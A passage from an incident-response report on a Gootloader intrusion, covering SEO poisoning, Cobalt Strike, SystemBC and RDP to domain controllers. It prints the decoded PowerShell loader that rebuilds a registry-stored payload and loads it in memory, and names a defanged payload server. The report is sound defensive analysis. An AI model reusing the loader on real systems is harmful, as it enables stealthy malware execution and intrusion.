	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Friday, October 25, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-28305" class="post-28305 post type-post status-publish format-standard hentry category-gootloader entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-94" href="https://thedfirreport.com/category/gootloader/">gootloader</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">SEO Poisoning to Domain Control: The Gootloader Saga Continues</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/" rel="bookmark"><time class="entry-date published" datetime="2024-02-26T00:39:52+00:00">February 26, 2024</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 id="key" class="wp-block-heading"><a href="#key">Key Takeaways</a></h2>



<ul class="wp-block-list">
<li>In February 2023, we detected an intrusion that was initiated by a user downloading and executing a file from a SEO-poisoned search result, leading to a Gootloader infection.</li>



<li>Around nine hours after the initial infection, the Gootloader malware facilitated the deployment of a Cobalt Strike beacon payload directly into the host&#8217;s registry, and then executed it in memory.</li>





<li>The threat actor deployed SystemBC to tunnel RDP access into the network, which aided in compromising domain controllers, backup servers, and other key servers.</li>
<li>The threat actor conducted an interactive review of sensitive and confidential files using RDP; however, we have been unable to confirm whether any data was actually exfiltrated.</li>
</ul>



<p>More information about Gootloader can be found in the following reports: <a href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/" target="_blank" rel="noreferrer noopener">The DFIR Report</a>, <a href="https://gootloader.wordpress.com/" target="_blank" rel="noreferrer noopener">GootloaderSites</a>, <a href="https://www.mandiant.com/resources/blog/tracking-evolution-gootloader-operations" target="_blank" rel="noreferrer noopener">Mandiant</a>, <a href="https://redcanary.com/blog/gootloader/" target="_blank" rel="noreferrer noopener">Red Canary</a>, &amp; <a href="https://www.kroll.com/en/insights/publications/cyber/deep-dive-gootloader-malware-infection-chain" target="_blank" rel="noreferrer noopener">Kroll</a>.</p>
<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/episodes/SEO-Poisoning-to-Domain-Control-The-Gootloader-Saga-Continues-e2g8u8j" target="_blank" rel="noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/seo-poisoning-to-domain-control-the-gootloader-saga/id1728699064?i=1000646812682" target="_blank" rel="noopener">Apple</a>, <a href="https://www.youtube.com/watch?v=FNOCcRkd45g" target="_blank" rel="noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/episodes/2ff23a11-1122-4e44-b965-5d2fa994bc24/seo-poisoning-to-domain-control-the-gootloader-saga-continues" target="_blank" rel="noopener">Amazon</a>.</p>
<p>Submit your <a href="https://forms.office.com/r/MwZXkBrUNv" target="_blank" rel="noopener">feedback</a> on this report for a chance to win free swag!</p>
<h2 id="services" class="wp-block-heading"><a href="#services">The DFIR Report Services</a></h2>
<p>

</p>
<p>We provide a range of services including Private Threat Briefs, which includes 25+ private reports yearly. These reports follow a format similar to our public reports but are more concise in nature and are published within weeks of the intrusion.</p>
<p>

</p>
<p>Another service we provide is our Threat Feed, specializing in tracking Command and Control frameworks such as Cobalt Strike, Metasploit, Sliver, and more.</p>
<p>

</p>
<p>Our comprehensive All Intel service includes the Private Threat Briefs and Threat Feed, with additional insights such as private events, long-term infrastructure tracking, clustering of intrusion data, Cobalt Strike configurations, C2 domains, and more.</p>
<p>

</p>
<p>We also offer a Private Ruleset which consists of exclusively curated rules using insights derived from Private Threat Briefs and other internal cases. This ruleset currently encompasses 100+ Sigma rules, created from the knowledge of 40+ cases. Each rule is mapped to ATT&amp;CK and accompanied by a test example.</p>
<p>We invite you to reach out for a personalized demo of our services via our <a href="https://thedfirreport.com/contact/" target="_blank" rel="noopener">Contact Us</a> page.</p>
<h2>Table of Contents:</h2>
<ul>
<li><a href="#case-summary">Case Summary</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#initial-access">Initial Access</a></li>
<li><a href="#execution">Execution</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#defense-evasion">Defense Evasion</a></li>
<li><a href="#credential-access">Credential Access</a></li>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#lateral-movement">Lateral Movement</a></li>
<li><a href="#collection">Collection</a></li>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#timeline">Timeline</a></li>
<li><a href="#diamond-model">Diamond Model</a></li>
<li><a href="#indicators">Indicators</a></li>
<li><a href="#detections">Detections</a></li>
<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
</ul>



<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>



<p>The intrusion started in February 2023, when a user conducted a search for &#8220;Implied Employment Agreement&#8221;. The people behind Gootloader frequently exploit terms related to contracts and agreements for search engine-optimization (SEO) poisoning. In this instance, the user encountered a SEO poisoned result and clicked on it. This action directed them to a compromised website that mimicked a user forum. On this webpage, a deceptive link enticed the user to download what was supposed to be an employment agreement.</p>



<p>Upon opening the received zip file, the user saw a JavaScript file bearing a name similar to their initial search term. Clicking on this file triggered the Gootloader malware&#8217;s execution process. This led to the creation of a new JavaScript file within the user&#8217;s AppData folder. To ensure its continuous operation, Gootloader established a scheduled task to run this newly created file, incorporating a logon trigger for persistence. The sequence ends with the execution of an obfuscated PowerShell script, which calls another PowerShell script.</p>



<p>This script performs some basic discovery of information about the host using built-in PowerShell Cmdlets and WMI queries. The script then reaches out to a rotating list of remote endpoints. Around nine hours after the initial execution, one of the remote endpoints responded to the Gootloader malware, providing a download that was written to two registry keys. Those registry keys contained an obfuscated launcher for Gootloader and a Cobalt Strike beacon, which was loaded directly into memory.</p>



<p>Next, an instance of process injection into dllhost was detected, accompanied by network connections to several remote hosts checking for LDAP and SMB. Additionally, LDAP network traffic directed to a domain controller was observed, indicating discovery operations targeting various groups, including Domain Users, Administrators, RDP Users, and Domain Administrators.</p>



<p>Approximately ten minutes after these activities, the threat actor initiated lateral movement within the network. This involved creating a remote service to disable Windows Defender&#8217;s Real-Time Monitoring. Subsequently, they transferred a Cobalt Strike beacon executable over SMB and executed it as a service. Following this, additional process injections and access to the LSASS memory, were observed on the compromised hosts.</p>



<p>The threat actor continued trying this method to move to various workstations and domain controllers. However, on the domain controllers, Windows Defender remained operational and successfully thwarted the attempts to launch the beacons. Despite these setbacks, the attacker continued their efforts from a compromised workstation, utilizing PowerView to conduct additional discovery tasks.</p>



<p>To breach the domain controller, the threat actor adjusted their strategy. They introduced a new PowerShell script onto a workstation and executed it, which was a PowerShell implementation of SystemBC. This script initiated communication with a command and control server and established persistence by creating a registry run key. Following this setup, the threat actor executed multiple commands through remote services on a domain controller to ensure RDP access was enabled. They then logged into the domain controller over RDP by routing the connection through the infected workstation using SystemBC.</p>



<p>Having gained access to the domain controller, the threat actor transferred a text file containing a series of commands through their RDP session, aimed at further attempts to disable Windows Defender. Despite these efforts, their attempt to deploy a PowerShell beacon seemed to be unsuccessful. Not deterred, they proceeded to install Advanced IP Scanner on the domain controller and initiated a network scan. While that was running, they explored a remote file share, during which they accessed a document containing password-related information.</p>



<p>The threat actor next turned their attention to a backup server, utilizing Windows Remote Management (WinRM) to execute multiple commands, ensuring that RDP access to the server was enabled and open. After ensuring RDP was available, they connected to the server via RDP and proceeded to review the backup configurations for the environment. During this time, they also deployed the SystemBC PowerShell script on the server. After this activity, there was a noticeable lull in the threat actor&#8217;s actions, with no significant activities recorded for the next five hours. Upon returning, the threat actor resumed accessing hosts over RDP.</p>



<p>The threat actor resumed their search for sensitive information by looking through file shares for documents pertaining to passwords, while operating from the backup server. Additionally, they executed Advanced IP Scanner again, this time from the backup server. Throughout their RDP session, they interactively viewed data, yet no direct signs of data exfiltration were observed during this phase of activity. After this, the threat actor&#8217;s presence on the network ceased, and they were not detected again prior to being evicted from the network.</p>





<p>Submit your <a href="https://forms.office.com/r/MwZXkBrUNv" target="_blank" rel="noopener">feedback</a> on this report for a chance to win free swag!</p>
<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>



<p>Analysis and reporting completed by <a href="https://twitter.com/_pete_0" target="_blank" rel="noopener">@_pete_0</a>, <a href="https://twitter.com/malforsec" target="_blank" rel="noopener">@malforsec</a> &amp; <a href="https://twitter.com/r3nzsec" target="_blank" rel="noopener">@r3nzsec</a></p>



<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>



<p>The initial access was achieved by the user navigating to a SEO-poisoned website via Google search. Once opened the site masquerades as a forum and with a download link to an &#8216;Implied Employment Agreement&#8217; document.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-28316" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-001.png" alt="" width="3310" height="1094" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-001.png 3310w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-001-300x99.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-001-1024x338.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-001-768x254.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-001-1536x508.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-001-2048x677.png 2048w" sizes="(max-width: 3310px) 100vw, 3310px" /></a></p>





<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-002.png"><img decoding="async" class="aligncenter size-full wp-image-28317" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-002.png" alt="" width="1004" height="623" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-002.png 1004w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-002-300x186.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-002-768x477.png 768w" sizes="(max-width: 1004px) 100vw, 1004px" /></a></p>



<p>In our previous analysis of Gootloader, detailed in our report, &#8220;<a href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/" target="_blank" rel="noreferrer noopener">SEO Poisoning: A Gootloader Story</a>,&#8221; we revisit the same initial access technique employed by threat actors. For a better understanding, we&#8217;ve included a <a href="https://www.youtube.com/watch?v=IdR-tlv7w48" target="_blank" rel="noreferrer noopener">video</a> in our previous report that visually demonstrates the user&#8217;s journey from SEO poisoning to encountering Gootloader malware.</p>



<p>The &#8216;Implied Employment Agreement&#8217; turned out to be a zip archive containing the GootLoader multistage loader. We can see from the below that the zip was downloaded from a website on the internet (ZoneId=3).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-003.png"><img decoding="async" class="aligncenter size-full wp-image-28318" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-003.png" alt="" width="3050" height="328" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-003.png 3050w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-003-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-003-1024x110.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-003-768x83.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-003-1536x165.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-003-2048x220.png 2048w" sizes="(max-width: 3050px) 100vw, 3050px" /></a></p>





<p>Below depicts the process of the start of the Gootloader infection:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28439" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1.png" alt="" width="4853" height="2964" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1.png 4853w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1-300x183.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1-1024x625.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1-768x469.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1-1536x938.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-004-1-2048x1251.png 2048w" sizes="(max-width: 4853px) 100vw, 4853px" /></a></p>
<p>&nbsp;</p>





<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>



<p>Gootloader employs several executions across the whole infection chain.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28438" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1.png" alt="" width="6000" height="3375" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1.png 6000w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1-300x169.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1-1024x576.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1-768x432.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1-1536x864.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-005-1-2048x1152.png 2048w" sizes="(max-width: 6000px) 100vw, 6000px" /></a></p>
<p>&nbsp;</p>





<p>The JavaScript file was executed after the user double-clicked on it within the opened zip archive.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28321" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-006.png" alt="" width="2052" height="228" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-006.png 2052w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-006-300x33.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-006-1024x114.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-006-768x85.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-006-1536x171.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-006-2048x228.png 2048w" sizes="(max-width: 2052px) 100vw, 2052px" /></a></p>





<figure class="wp-block-image"></figure>
<p>&nbsp;</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28738" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1.png" alt="" width="2264" height="1308" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1.png 2264w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1-300x173.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1-1024x592.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1-768x444.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1-1536x887.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-007-1-2048x1183.png 2048w" sizes="(max-width: 2264px) 100vw, 2264px" /></a></p>



<p>Execution of the Javascript file drops another Javascript file named &#8220;Frontline Management.js&#8221;. This dropped Javascript is heavily obfuscated.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28325" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-008.png" alt="" width="2588" height="740" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-008.png 2588w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-008-300x86.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-008-1024x293.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-008-768x220.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-008-1536x439.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-008-2048x586.png 2048w" sizes="(max-width: 2588px) 100vw, 2588px" /></a></p>





<p>In addition to the file, a new scheduled task named &#8216;InfrSiRfucture Technologies&#8217; was created. This task was then invoked to run the new Javascript file. The infection chain continues with a PowerShell script. The execution chain here is Svchost.exe(Scheduled Task) ➝ Wscript.exe ➝ Cscript.exe ➝ Powershell.exe</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28326" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-009.png" alt="" width="1240" height="83" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-009.png 1240w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-009-300x20.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-009-1024x69.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-009-768x51.png 768w" sizes="(max-width: 1240px) 100vw, 1240px" /></a></p>





<p>The PowerShell script included URLs to ten remote servers:</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-28742" src="https://thedfirreport.com/wp-content/uploads/2024/02/Untitled.png" alt="" width="2527" height="1267" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/Untitled.png 2527w, https://thedfirreport.com/wp-content/uploads/2024/02/Untitled-300x150.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/Untitled-1024x513.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/Untitled-768x385.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/Untitled-1536x770.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/Untitled-2048x1027.png 2048w" sizes="(max-width: 2527px) 100vw, 2527px" /></p>





<p>Not all the included remote servers were weaponized at the time of execution, so some servers answered with HTTP 405 &#8220;Method Not Allowed&#8221;.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-011-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28745" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-011-1.png" alt="" width="383" height="314" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-011-1.png 383w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-011-1-300x246.png 300w" sizes="(max-width: 383px) 100vw, 383px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28329" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-012.png" alt="" width="378" height="320" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-012.png 378w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-012-300x254.png 300w" sizes="(max-width: 378px) 100vw, 378px" /></a></p>







<p>For the server that was weaponized, however, there is a different response. For this intrusion, that was 46.28.105[.]94 with the URL &#8220;hxxp:blog[.]lilianpraskova[.]cz/xmlrpc[.]php&#8221;. The server then started answering with the HTTP status code 200 &#8220;OK&#8221; and delivering the final stage in the Gootloader infection.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28330" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-013.png" alt="" width="640" height="45" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-013.png 640w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-013-300x21.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28331" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-014.png" alt="" width="1353" height="46" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-014.png 1353w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-014-300x10.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-014-1024x35.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-014-768x26.png 768w" sizes="(max-width: 1353px) 100vw, 1353px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28332" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-015.png" alt="" width="925" height="165" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-015.png 925w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-015-300x54.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-015-768x137.png 768w" sizes="(max-width: 925px) 100vw, 925px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-016-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28746" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-016-1.png" alt="" width="381" height="364" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-016-1.png 381w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-016-1-300x287.png 300w" sizes="(max-width: 381px) 100vw, 381px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-017-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28750" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-017-1.png" alt="" width="380" height="639" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-017-1.png 380w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-017-1-178x300.png 178w" sizes="(max-width: 380px) 100vw, 380px" /></a></p>













<p>The final download contained three different components. Gootloader stage1(prameter $cXqt) which was an obfuscated dll, Gootloader stage2(parameter $IbaY) which ended up as an exe file when deobfuscated. Finally, a script wrote stage1 and stage2 into the registry before deobfuscating stage1 and loading that into memory. Stage1 took care of the deobfuscation of stage2, the final payload for Gootloader, and loaded what we later will see is a Cobalt Strike Beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28336" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-018.png" alt="" width="1602" height="185" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-018.png 1602w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-018-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-018-1024x118.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-018-768x89.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-018-1536x177.png 1536w" sizes="(max-width: 1602px) 100vw, 1602px" /></a></p>
<p>&nbsp;</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-019-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28747" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-019-1.png" alt="" width="799" height="135" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-019-1.png 799w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-019-1-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-019-1-768x130.png 768w" sizes="(max-width: 799px) 100vw, 799px" /></a></p>







<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28339" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-020.png" alt="" width="1660" height="480" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-020.png 1660w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-020-300x87.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-020-1024x296.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-020-768x222.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-020-1536x444.png 1536w" sizes="(max-width: 1660px) 100vw, 1660px" /></a></p>



<p>The encoded PowerShell command that ran is beautified and decoded below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28340" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-021.png" alt="" width="2356" height="210" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-021.png 2356w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-021-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-021-1024x91.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-021-768x68.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-021-1536x137.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-021-2048x183.png 2048w" sizes="(max-width: 2356px) 100vw, 2356px" /></a></p>





<p>Here&#8217;s the decoded value:</p>
<pre>609265940; sleep -s (20); 60213434; $sxd="hkcu:\software\microsoft\Personalization\geRBAdXTDCkN"; $tGSWK=gp -path $sxd; for ($tGSWKgjA=0; $tGSWKgjA -le 705; $tGSWKgjA++){Try{$OHhnP+=$tGSWK.$tGSWKgjA}Catch{}}; $tGSWKgjA=0; while($true){$tGSWKgjA++; $ko=[math]::("sqrt")($tGSWKgjA); if($ko -eq 1000){break}}$CVaW=$OHhnP.replace("#",$ko); $lSfdm=[byte[]]::("new")($CVaW.Length/2); for($tGSWKgjA=0; $tGSWKgjA -lt $CVaW.Length; $tGSWKgjA+=2){$lSfdm[$tGSWKgjA/2]=[convert]::("ToByte")($CVaW.Substring($tGSWKgjA,2),(2*8))}[reflection.assembly]::("Load")($lSfdm); [Open]::("Test")(); 809902482;</pre>



<p>Decoding the JavaScript stager payload manually could be time-consuming, so we used <a href="https://github.com/mandiant/gootloader" target="_blank" rel="noreferrer noopener">this</a> fantastic script made by Mandiant. This is a collection of scripts used to deobfuscate Gootloader malware samples. We used the <a href="https://github.com/mandiant/gootloader/blob/main/GootLoaderAutoJsDecode.py" target="_blank" rel="noreferrer noopener">GootLoaderAutoJSDecode.py</a> Python script that automatically decodes .js files using static analysis.</p>
